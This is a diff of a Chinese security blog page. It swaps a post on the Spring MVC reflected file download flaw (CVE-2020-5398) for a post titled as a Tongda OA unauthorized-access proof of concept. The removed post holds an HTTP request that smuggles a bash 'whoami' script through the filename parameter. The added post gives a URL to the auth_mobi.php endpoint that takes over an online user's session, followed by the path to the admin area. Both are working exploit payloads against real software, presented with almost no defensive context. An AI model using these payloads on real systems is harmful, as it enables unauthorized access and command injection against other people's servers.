@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>CVE-2020-5398-Spring MVC的RFD 反射文件下载 | GMF信息小站</title>
+    <title>通达OA未授权访问PoC | GMF信息小站</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1615254355370.css">
+<link rel="stylesheet" href="/css/style.css?v=1615254355341.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2021/01/16/CVE-2020-5398-Spring-MVC%E7%9A%84RFD-%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.html" class="item ">
+            <li rel="/2021/03/09/%E9%80%9A%E8%BE%BEOA%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEPoC/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2021/01/16/CVE-2020-5398-Spring-MVC%E7%9A%84RFD-%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.html" class="item ">
+            <li rel="/2021/03/09/%E9%80%9A%E8%BE%BEOA%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEPoC/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,17 +105,18 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>CVE-2020-5398-Spring MVC的RFD 反射文件下载</span></h3>
+        <h3 class="post-title"><span>通达OA未授权访问PoC</span></h3>
     </header>
     <p class="post-meta text-center">
         givemefivw 发表于
-        <time datetime="2021-01-16T12:15:37.000Z">2021-01-16</time>
+        <time datetime="2021-03-09T01:43:14.000Z">2021-03-09</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>当响应中设置了<code>Content-Disposition</code>头且<code>filename</code>属性是用户可控时容易受到RFD攻击</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1、<code>header</code>使用<code>org.springframework.http.ContentDisposition</code>来预备<br>2、文件名是通过<code>ContentDisposition.Builder#filename(String)</code>或 <code>ContentDisposition.Builder#filename(String, US_ASCII)</code>来设置。<br>3、文件名(包括文件名后缀)为用户可控。<br>4、攻击者已将下载的响应内容注入恶意命令</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Spring Framework 5.2.0 to 5.2.2，5.1.0 to 5.1.12，5.0.0 to 5.0.15</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?filename&#x3D;sample.sh%22%3B&amp;contents&#x3D;%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP&#x2F;1.1 </span><br><span class="line">Host: ip:8080 </span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0 </span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,&#x2F;;q&#x3D;0.8 Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3 </span><br><span class="line">Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+        <h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li>当前有用户在线</li>
+</ul>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;访问出现空白时，证明利用成功，如果返回RELOGIN字段，说明当前无人在线</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;general&#x2F;</span><br></pre></td></tr></table></figure>
+
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
@@ -152,20 +153,16 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2021/01/16/CVE-2020-11991-Apache-Cocoon-XML-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
-            
-                CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞
-            
-        </a>
+        <a href="javascript: void(0);">没有上一篇了</a>
     </span>
     
 
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2021/01/16/CVE-2020-17519-Apache-Flink-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+        <a href="/2021/03/05/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%881/">
             
-                CVE-2020-17519 Apache Flink 任意文件读取漏洞
+                随笔杂谈
             
         </a>
     </span>
@@ -291,7 +288,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1615254355372.js"></script>
+<script src="/js/main.js?v=1615254355342.js"></script>
 
 
 </body>
